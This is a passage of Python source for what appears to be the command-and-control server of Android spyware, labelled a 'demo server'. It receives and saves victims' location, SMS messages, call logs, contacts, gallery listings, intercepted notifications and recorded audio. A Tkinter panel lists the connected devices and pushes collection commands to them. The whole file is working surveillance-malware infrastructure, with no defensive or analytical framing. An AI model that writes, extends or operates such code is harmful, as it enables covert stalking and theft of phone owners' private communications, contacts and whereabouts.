def handle_json_message(self, session, message):
        """Handle incoming JSON messages"""
        msg_type = message.get("type", "info")

        if msg_type == "heartbeat":
            session.last_heartbeat = time.time()
            self.log(f"[♥] Heartbeat from session {session.session_id} ({session.address[0]})")

        elif msg_type == "device_info":
            session.device_info = message.get("device_info", {})
            session.last_heartbeat = time.time()
            info = session.device_info
            self.log(f"[i] Device info from session {session.session_id}:")
            self.log(f"    Model: {info.get('model', 'Unknown')}")
            self.log(f"    Android: {info.get('android_version', 'Unknown')}")
            self.log(f"    App Version: {info.get('app_version', 'Unknown')}")
            self.log(f"    Emulator: {info.get('is_emulator', 'Unknown')}")
            self.log(f"    Device ID: {info.get('device_id', 'Unknown')}")
            perms = message.get("permissions", [])
            self.log(f"    Permissions granted: {len(perms)}")
            self.log_to_file(message, session.address)

        elif msg_type == "location":
            lat = message.get("latitude", "Unknown")
            lon = message.get("longitude", "Unknown")
            acc = message.get("accuracy", "Unknown")
            self.log(f"[i] Location from session {session.session_id}:")
            self.log(f"    Latitude: {lat}")
            self.log(f"    Longitude: {lon}")
            self.log(f"    Accuracy: {acc}m")
            self.log_to_file(message, session.address)

        elif msg_type == "gallery_list":
            files = message.get("files", [])
            self.log(f"[i] Gallery file list from session {session.session_id} ({len(files)} items):")
            for f in files[:20]:
                if isinstance(f, dict):
                    self.log(f"    - [{f.get('id', '?')}] {f.get('name', '?')} ({f.get('size', 0)} bytes)")
                else:
                    self.log(f"    - {f}")
            if len(files) > 20:
                self.log(f"    ... and {len(files) - 20} more")
            # Save gallery list to file
            gallery_file = os.path.join(DOCS_DIR, f"gallery_list_{session.session_id}_{int(time.time())}.json")
            with open(gallery_file, 'w') as f:
                json.dump(files, f, indent=2)
            self.log(f"    [+] Saved to: {gallery_file}")
            self.log_to_file(message, session.address)

        elif msg_type == "file_list_legacy":
            # Legacy format: simple string array
            files = message.get("files", [])
            self.log(f"[i] Gallery file list (legacy) from session {session.session_id} ({len(files)} files):")
            for f in files[:20]:
                self.log(f"    - {f}")
            if len(files) > 20:
                self.log(f"    ... and {len(files) - 20} more")
            self.log_to_file(message, session.address)

        elif msg_type == "app_list":
            apps = message.get("apps", [])
            self.log(f"[i] Installed apps from session {session.session_id} ({len(apps)} apps):")
            for app in apps[:15]:
                self.log(f"    - {app}")
            if len(apps) > 15:
                self.log(f"    ... and {len(apps) - 15} more")
            self.log_to_file(message, session.address)

        elif msg_type == "file_transfer_start":
            filename = message.get("filename", "unknown")
            file_size = message.get("size", 0)
            file_type = message.get("file_type", "image")
            session.device_info["pending_file"] = {
                "filename": filename,
                "size": file_size,
                "type": file_type,
                "data": b""
            }
            self.log(f"[i] Receiving file from session {session.session_id}:")
            self.log(f"    Name: {filename}")
            self.log(f"    Size: {file_size} bytes")
            self.log(f"    Type: {file_type}")

            ack = json.dumps({"type": "ack", "message": "ready_to_receive"}).encode('utf-8')
            session.client_socket.send(ack)
            with self.lock:
                session.bytes_sent += len(ack)

        elif msg_type == "file_transfer_complete":
            self.log(f"[+] File transfer complete from session {session.session_id}")
            self.log_to_file(message, session.address)

        elif msg_type == "command_response":
            cmd = message.get("command", "unknown")
            status = message.get("status", "unknown")
            payload = message.get("payload", {})
            self.log(f"[i] Command response from session {session.session_id}:")
            self.log(f"    Command: {cmd}")
            self.log(f"    Status: {status}")
            if payload:
                self.log(f"    Payload: {json.dumps(payload)}")
            self.log_command(cmd, session.session_id, f"response: {status}")
            self.log_to_file(message, session.address)

        elif msg_type == "audio_data":
            audio_b64 = message.get("data", "")
            if audio_b64:
                audio_bytes = base64.b64decode(audio_b64)
                filename = f"audio_{int(time.time())}.3gp"
                filepath = os.path.join(AUDIO_DIR, filename)
                with open(filepath, 'wb') as f:
                    f.write(audio_bytes)
                self.log(f"[+] Audio saved: {filepath} ({len(audio_bytes)} bytes)")
                with self.lock:
                    session.total_audio_received += 1
            self.log_to_file(message, session.address)

        # === v4.0 NEW MESSAGE HANDLERS ===

        elif msg_type == "call_logs":
            calls = message.get("calls", [])
            count = message.get("count", 0)
            self.log(f"[i] Call logs from session {session.session_id} ({count} calls):")
            for call in calls[:20]:
                call_type = call.get("type", 0)
                type_str = {1: "INCOMING", 2: "OUTGOING", 3: "MISSED", 4: "VOICEMAIL", 5: "REJECTED", 6: "BLOCKED"}.get(call_type, "UNKNOWN")
                self.log(f"    [{type_str}] {call.get('name', 'Unknown')} - {call.get('number', '?')} ({call.get('duration_sec', 0)}s)")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            # Save to file
            calllog_file = os.path.join(DOCS_DIR, f"call_logs_{session.session_id}_{int(time.time())}.json")
            with open(calllog_file, 'w') as f:
                json.dump(calls, f, indent=2)
            self.log(f"    [+] Saved to: {calllog_file}")
            self.log_to_file(message, session.address)

        elif msg_type == "contacts":
            contacts = message.get("contacts", [])
            count = message.get("count", 0)
            self.log(f"[i] Contacts from session {session.session_id} ({count} contacts):")
            for contact in contacts[:20]:
                name = contact.get("name", "Unknown")
                phones = contact.get("phones", [])
                phone_str = ", ".join(str(p) if isinstance(p, str) else p.get("number", "") for p in phones)
                self.log(f"    - {name}: {phone_str}")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            # Save to file
            contacts_file = os.path.join(DOCS_DIR, f"contacts_{session.session_id}_{int(time.time())}.json")
            with open(contacts_file, 'w') as f:
                json.dump(contacts, f, indent=2)
            self.log(f"    [+] Saved to: {contacts_file}")
            self.log_to_file(message, session.address)

        elif msg_type == "sms_logs":
            sms_list = message.get("sms", [])
            count = message.get("count", 0)
            self.log(f"[i] SMS logs from session {session.session_id} ({count} messages):")
            for sms in sms_list[:20]:
                from_num = sms.get("from", "?")
                body = sms.get("body", "")[:60]
                msg_type_map = {1: "INBOX", 2: "SENT", 3: "DRAFT", 4: "OUTBOX"}
                sms_type = msg_type_map.get(sms.get("type", 1), "UNKNOWN")
                self.log(f"    [{sms_type}] {from_num}: {body}...")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            # Save to file
            sms_file = os.path.join(DOCS_DIR, f"sms_logs_{session.session_id}_{int(time.time())}.json")
            with open(sms_file, 'w') as f:
                json.dump(sms_list, f, indent=2)
            self.log(f"    [+] Saved to: {sms_file}")
            self.log_to_file(message, session.address)

        elif msg_type == "file_list":
            # File browser results (from list_files command)
            files = message.get("files", [])
            path = message.get("path", "")
            count = message.get("count", 0)
            self.log(f"[i] File browser from session {session.session_id} - Path: {path} ({count} items):")
            for f in files[:20]:
                name = f.get("name", "?")
                is_dir = f.get("is_directory", False)
                size = f.get("size", 0)
                marker = "📁" if is_dir else "📄"
                self.log(f"    {marker} {name}" + (f" ({size} bytes)" if not is_dir else ""))
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            self.log_to_file(message, session.address)

        elif msg_type == "storage_info":
            self.log(f"[i] Storage info from session {session.session_id}:")
            self.log(f"    Total: {message.get('total_gb', '?')} GB")
            self.log(f"    Free:  {message.get('free_gb', '?')} GB")
            self.log(f"    Used:  {message.get('used_percent', '?')}%")
            self.log_to_file(message, session.address)

        elif msg_type == "notification":
            notif = message.get("notification", {})
            package = notif.get("package", "Unknown")
            title = notif.get("title", "")
            text = notif.get("text", "")
            self.log(f"[📬] Notification from {package}:")
            self.log(f"     Title: {title}")
            self.log(f"     Text: {text}")
            with self.lock:
                session.total_notifications_received += 1
                session.notifications_buffer.append(notif)
            self.log_to_file(message, session.address)

        elif msg_type == "active_notifications":
            notifications = message.get("notifications", [])
            count = message.get("count", 0)
            self.log(f"[i] Active notifications from session {session.session_id} ({count} notifications):")
            for n in notifications[:20]:
                self.log(f"    [{n.get('package', '?')}] {n.get('title', '')}: {n.get('text', '')}")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            self.log_to_file(message, session.address)

        else:
            self.log(f"[i] Message from session {session.session_id}: {msg_type}")
            self.log_to_file(message, session.address)


class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Android Device Demo Server - GUI")
        self.root.geometry("900x600")
        self.log_queue = queue.Queue()
        self.server = None
        self.server_thread = None
        self.setup_gui()
        self.update_log_display()

    def setup_gui(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Control panel
        control_frame = ttk.LabelFrame(main_frame, text="Server Control", padding="10")
        control_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(control_frame, text="Host:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.host_var = tk.StringVar(value="0.0.0.0")
        ttk.Entry(control_frame, textvariable=self.host_var, width=15).grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)

        ttk.Label(control_frame, text="Port:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=2)
        self.port_var = tk.StringVar(value="8000")
        ttk.Entry(control_frame, textvariable=self.port_var, width=8).grid(row=0, column=3, sticky=tk.W, padx=5, pady=2)

        self.start_button = ttk.Button(control_frame, text="Start Server", command=self.start_server)
        self.start_button.grid(row=0, column=4, padx=10, pady=2)

        self.stop_button = ttk.Button(control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=5, padx=5, pady=2)

        # Device list frame
        device_frame = ttk.LabelFrame(main_frame, text="Connected Devices", padding="10")
        device_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))

        # Treeview for devices
        columns = ("id", "ip", "model", "status", "images", "videos", "notifications")
        self.device_tree = ttk.Treeview(device_frame, columns=columns, show="headings", height=8)
        self.device_tree.heading("id", text="ID")
        self.device_tree.heading("ip", text="IP Address")
        self.device_tree.heading("model", text="Device Model")
        self.device_tree.heading("status", text="Status")
        self.device_tree.heading("images", text="Images")
        self.device_tree.heading("videos", text="Videos")
        self.device_tree.heading("notifications", text="Notifications")

        self.device_tree.column("id", width=50)
        self.device_tree.column("ip", width=100)
        self.device_tree.column("model", width=150)
        self.device_tree.column("status", width=80)
        self.device_tree.column("images", width=60)
        self.device_tree.column("videos", width=60)
        self.device_tree.column("notifications", width=80)

        self.device_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbar for treeview
        tree_scroll = ttk.Scrollbar(device_frame, orient=tk.VERTICAL, command=self.device_tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.device_tree.configure(yscrollcommand=tree_scroll.set)

        # Log frame
        log_frame = ttk.LabelFrame(main_frame, text="Server Log", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True)

        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)

        # Command frame (for sending commands to devices)
        cmd_frame = ttk.LabelFrame(main_frame, text="Send Command", padding="10")
        cmd_frame.pack(fill=tk.X, pady=(10, 0))

        ttk.Label(cmd_frame, text="Command:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.cmd_var = tk.StringVar()
        ttk.Entry(cmd_frame, textvariable=self.cmd_var, width=30).grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)

        ttk.Label(cmd_frame, text="Args (JSON):").grid(row=0, column=2, sticky=tk.W, padx=5, pady=2)
        self.args_var = tk.StringVar()
        ttk.Entry(cmd_frame, textvariable=self.args_var, width=30).grid(row=0, column=3, sticky=tk.W, padx=5, pady=2)

        ttk.Button(cmd_frame, text="Send", command=self.send_command).grid(row=0, column=4, padx=10, pady=2)

        # Predefined command buttons
        predefined_frame = ttk.Frame(cmd_frame)
        predefined_frame.grid(row=1, column=0, columnspan=5, pady=5)

        ttk.Button(predefined_frame, text="Get Device Info", command=lambda: self.send_predefined("get_device_info")).grid(row=0, column=0, padx=2)
        ttk.Button(predefined_frame, text="Get Location", command=lambda: self.send_predefined("get_location")).grid(row=0, column=1, padx=2)
        ttk.Button(predefined_frame, text="Get Gallery List", command=lambda: self.send_predefined("get_gallery_list")).grid(row=0, column=2, padx=2)
        ttk.Button(predefined_frame, text="Get SMS Logs", command=lambda: self.send_predefined("get_sms_logs")).grid(row=0, column=3, padx=2)
        ttk.Button(predefined_frame, text="Get Call Logs", command=lambda: self.send_predefined("get_call_logs")).grid(row=0, column=4, padx=2)

    def start_server(self):
        if self.server_thread and self.server_thread.is_alive():
            messagebox.showwarning("Warning", "Server is already running!")
            return

        host = self.host_var.get()
        try:
            port = int(self.port_var.get())
        except ValueError:
            messagebox.showerror("Error", "Port must be a number")
            return

        self.log("Starting server...")
        self.server = DemoServer(host=host, port=port, log_queue=self.log_queue, console_mode=False)
        self.server_thread = threading.Thread(target=self.server.start, daemon=True)
        self.server_thread.start()

        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f"Server started on {host}:{port}")

    def stop_server(self):
        if self.server:
            self.log("Stopping server...")
            self.server.running = False
            try:
                self.server.server_socket.close()
            except:
                pass
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.log("Server stopped.")

    def send_command(self):
        if not self.server or not self.server.running:
            messagebox.showwarning("Warning", "Server is not running!")
            return

        command = self.cmd_var.get().strip()
        if not command:
            messagebox.showwarning("Warning", "Please enter a command")
            return

        args = self.args_var.get().strip()
        # Send command to all devices
        self.server.send_command_to_all(command, args)
        self.log(f"Sent command '{command}' with args: {args}")

        # Clear the entry fields
        self.cmd_var.set("")
        self.args_var.set("")

    def send_predefined(self, command):
        self.cmd_var.set(command)
        self.args_var.set("")
        self.send_command()

    def update_log_display(self):
        # Process log queue and update the text widget
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log_text.config(state=tk.NORMAL)
                self.log_text.insert(tk.END, msg + "\n")
                self.log_text.see(tk.END)
                self.log_text.config(state=tk.DISABLED)
        except queue.Empty:
            pass

        # Update device list
        if self.server:
            self.update_device_list()

        # Schedule next update
        self.root.after(100, self.update_log_display)

    def update_device_list(self):
        # Clear existing items
        for item in self.device_tree.get_children():
            self.device_tree.delete(item)

        # Add current devices
        with self.server.lock:
            for sid, session in self.server.sessions.items():
                if session.connected:
                    status = "ONLINE"
                else:
                    status = "OFFLINE"
                model = session.device_info.get('model', 'Unknown')
                self.device_tree.insert("", tk.END, values=(
                    sid,
                    session.address[0],
                    model,
                    status,
                    session.total_images_received,
                    session.total_videos_received,
                    session.total_notifications_received
                ))


def main():
    root = tk.Tk()
    app = ServerGUI(root)
    root.protocol("WM_DELETE_WINDOW", lambda: [app.stop_server() if app.server else None, root.destroy()])
    root.mainloop()


if __name__ == "__main__":
    if TKINTER_AVAILABLE:
        main()
    else:
        print("Tkinter not available. Running in console mode.")
        # Fallback to console server
        import sys
        server = DemoServer(console_mode=True)
        server.start()